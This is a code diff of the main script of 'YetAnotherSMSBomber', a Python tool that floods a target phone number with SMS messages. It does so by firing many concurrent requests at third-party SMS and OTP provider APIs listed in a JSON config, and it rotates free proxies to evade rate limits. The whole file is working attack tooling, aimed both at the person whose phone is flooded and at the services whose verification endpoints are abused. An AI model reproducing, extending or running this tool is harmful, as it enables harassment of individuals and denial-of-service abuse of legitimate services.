@@ -1,89 +1,132 @@
-#!/usr/bin/python3
+#!/usr/bin/env python3
 
-import requests
-import argparse
+# YetAnotherSMSBomber - A clean, small and powerful SMS bomber script.
+# Copyright (C) 2020 Avinash Reddy <https://github.com/AvinashReddy3108>
+#
+# YetAnotherSMSBomber is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# YetAnotherSMSBomber is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with YetAnotherSMSBomber.  If not, see <https://www.gnu.org/licenses/>.
+
 from concurrent.futures import ThreadPoolExecutor
+from utils import APIRequestsHandler, CustomArgumentParser
 import json
+import requests
+import random
 import time
-from Provider import Provider
 
-# args
-parser = argparse.ArgumentParser()
-parser.add_argument(
-    'target',
-    metavar='TARGET',
-    type=lambda value: (_ for _ in ()).throw(
-        argparse.ArgumentTypeError(f'{value} is an invalid mobile number'))
-    if 13 <= len(value) <= 4 else value,
-    help='Target mobile number without country code')
-parser.add_argument('--sms',
-                    '-S',
-                    type=int,
-                    help='Number of sms to target (default: 30)',
-                    default=30)
-parser.add_argument('--country',
-                    '-c',
-                    type=int,
-                    help='Country code without (+) sign (default: 91)',
-                    default=91)
-parser.add_argument(
-    '--threads',
-    '-T',
-    type=int,
-    help='Max number of concurrent HTTP(s) requests (default: 15)',
-    default=15)
-parser.add_argument(
-    '--proxy',
-    '-p',
-    action='store_true',
-    help=
-    'Use proxy for bombing (It is advisable to use this option if you are bombing more than 5000 sms)'
+ascii_art = r"""
+ __   __     _        _                   _    _                    
+ \ \ / /___ | |_     / \    _ __    ___  | |_ | |__    ___  _ __    
+  \ V // _ \| __|   / _ \  | '_ \  / _ \ | __|| '_ \  / _ \| '__|   
+   | ||  __/| |_   / ___ \ | | | || (_) || |_ | | | ||  __/| |      
+   |_| \___| \__| /_/   \_\|_| |_| \___/  \__||_| |_| \___||_|      
+  ____   __  __  ____    ____                     _                 
+ / ___| |  \/  |/ ___|  | __ )   ___   _ __ ___  | |__    ___  _ __ 
+ \___ \ | |\/| |\___ \  |  _ \  / _ \ | '_ ` _ \ | '_ \  / _ \| '__|
+  ___) || |  | | ___) | | |_) || (_) || | | | | || |_) ||  __/| |   
+ |____/ |_|  |_||____/  |____/  \___/ |_| |_| |_||_.__/  \___||_|   
+                                                                    
+"""
+
+parser = CustomArgumentParser(
+    allow_abbrev=False,
+    add_help=False,
+    description="YetAnotherSMSBomber - A clean, small and powerful SMS bomber script.",
+    epilog="Use this for fun, not for revenge or bullying!",
 )
-parser.add_argument('--verbose', '-v', action='store_true', help='Verbose')
-parser.add_argument('--verify',
-                    '-V',
-                    action='store_true',
-                    help='To verify all providers are working or not')
+parser.add_argument(
+    "target",
+    metavar="TARGET",
+    type=lambda x: (13 >= len(str(int(x))) >= 4)
+    and int(x)
+    or parser.error('"%s" is an invalid mobile number!' % int(x)),
+    help="Target mobile number without country code.",
+)
+parser.add_argument(
+    "--config-path",
+    "-c",
+    default="api_config.json",
+    help="Path to API config file. (NOTE: the file must be in JSON format!)",
+)
+parser.add_argument(
+    "--num", "-N", type=int, help="Number of SMSs to send to TARGET.", default=30
+)
+parser.add_argument(
+    "--country", "-C", type=int, help="Country code without (+) sign.", default=91,
+)
+parser.add_argument(
+    "--threads",
+    "-T",
+    type=int,
+    help="Max number of concurrent HTTP(s) requests.",
+    default=15,
+)
+parser.add_argument(
+    "--timeout",
+    "-t",
+    type=int,
+    help="Time (in seconds) to wait for an API request to complete.",
+    default=10,
+)
+parser.add_argument(
+    "--proxy",
+    "-P",
+    action="store_true",
+    help="Use proxy for bombing. (Recommended for large number of SMSs)",
+)
+parser.add_argument(
+    "--verbose",
+    "-v",
+    action="store_true",
+    help="Enables verbose output, for debugging.",
+)
+parser.add_argument(
+    "--verify",
+    "-V",
+    action="store_true",
+    help="To verify all providers are working or not.",
+)
+parser.add_argument("-h", "--help", action="help", help="Display this message.")
 args = parser.parse_args()
 
 # config loading
+config = args.config_path
 target = str(args.target)
+country_code = str(args.country)
 no_of_threads = args.threads
-no_of_sms = args.sms
+no_of_sms = args.num
 failed, success = 0, 0
 
-print(r"""
- __ __       _      _____            _    _
-|  |  | ___ | |_   |  _  | ___  ___ | |_ | |_  ___  ___
-|_   _|| -_||  _|  |     ||   || . ||  _||   || -_||  _|
-  |_|  |___||_|    |__|__||_|_||___||_|  |_|_||___||_|
- _____  _____  _____    _____              _
-|   __||     ||   __|  | __  | ___  _____ | |_  ___  ___
-|__   || | | ||__   |  | __ -|| . ||     || . || -_||  _|
-|_____||_|_|_||_____|  |_____||___||_|_|_||___||___||_|
-""")
-
+print(ascii_art)
 not args.verbose and not args.verify and print(
-    f'Target: {target} | Threads: {no_of_threads} | SMS-Bombs: {no_of_sms}')
+    f"Target: {target} | Threads: {no_of_threads} | SMS-Bombs: {no_of_sms}"
+)
 
 
 # proxy setup
 # https://gimmeproxy.com/api/getProxy?curl=true&protocol=http&supportsHttps=true
 def get_proxy():
-    args.verbose and print('Fetching proxies from server.....')
+    args.verbose and print("Fetching proxies from server.....")
     curl = requests.get(
-        'https://gimmeproxy.com/api/getProxy?curl=true&protocol=http&supportsHttps=true'
+        "https://gimmeproxy.com/api/getProxy?curl=true&protocol=http&supportsHttps=true"
     ).text
-    if 'limit' in curl:
-        print('Proxy limitation error. Try without `-p` or `--proxy` argument')
+    if "limit" in curl:
+        print("Proxy limitation error. Try without `-p` or `--proxy` argument")
         exit()
-    args.verbose and print(f'Using Proxy: {curl}')
+    args.verbose and print(f"Using Proxy: {curl}")
     return {"http": curl, "https": curl}
 
 
 proxies = get_proxy() if args.proxy else None
-
-# proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 
 
 # bomber function
@@ -100,40 +143,52 @@ def bomber(p):
                 failed += 1
         except:
             failed += 1
-            args.verbose or args.verify and print('{:12}: error'.format(
-                p.config['name']))
     not args.verbose and not args.verify and print(
-        f'Bombing : {success+failed}/{no_of_sms} | Success: {success} | Failed: {failed}',
-        end='\r')
-    if args.proxy and (success + failed % 30 == 0):
+        f"Bombing : {success+failed}/{no_of_sms} | Success: {success} | Failed: {failed}",
+        end="\r",
+    )
+    if args.proxy and ((success + failed) // random.randint(5, 20)) == 0:
         proxies = get_proxy()
 
 
 # threadsssss
 start = time.time()
+providers = json.load(open(config, "r"))["providers"]
 if args.verify:
-    providers = json.load(open('config.json', 'r'))['providers']
     pall = [p for x in providers.values() for p in x]
-    print(f'Processing {len(pall)} providers, please wait!\n')
+    print(f"Processing {len(pall)} providers, please wait!\n")
     with ThreadPoolExecutor(max_workers=len(pall)) as executor:
         for config in pall:
             executor.submit(
                 bomber,
-                Provider(target,
-                         proxy=proxies,
-                         verbose=True,
-                         cc=str(args.country),
-                         config=config))
+                APIRequestsHandler(
+                    target,
+                    proxy=proxies,
+                    verbose=True,
+                    timeout=args.timeout,
+                    cc=country_code,
+                    config=config,
+                ),
+            )
 else:
     with ThreadPoolExecutor(max_workers=no_of_threads) as executor:
         for i in range(no_of_sms):
-            p = Provider(target,
-                         proxy=proxies,
-                         verbose=args.verbose,
-                         cc=str(args.country))
+            p = APIRequestsHandler(
+                target,
+                proxy=proxies,
+                verbose=args.verbose,
+                timeout=args.timeout,
+                cc=country_code,
+                config=random.choice(
+                    providers[country_code] + providers["multi"]
+                    if country_code in providers
+                    else providers["multi"]
+                ),
+            )
             executor.submit(bomber, p)
 end = time.time()
 
 # finalize
-print(f'\nSuccess: {success} | Failed: {failed}')
-print(f'Took {end-start:.2f}s to complete')
+(args.verbose or args.verify) and print(f"\nSuccess: {success} | Failed: {failed}")
+not (args.verbose or args.verify) and print()
+print(f"Took {end-start:.2f}s to complete")
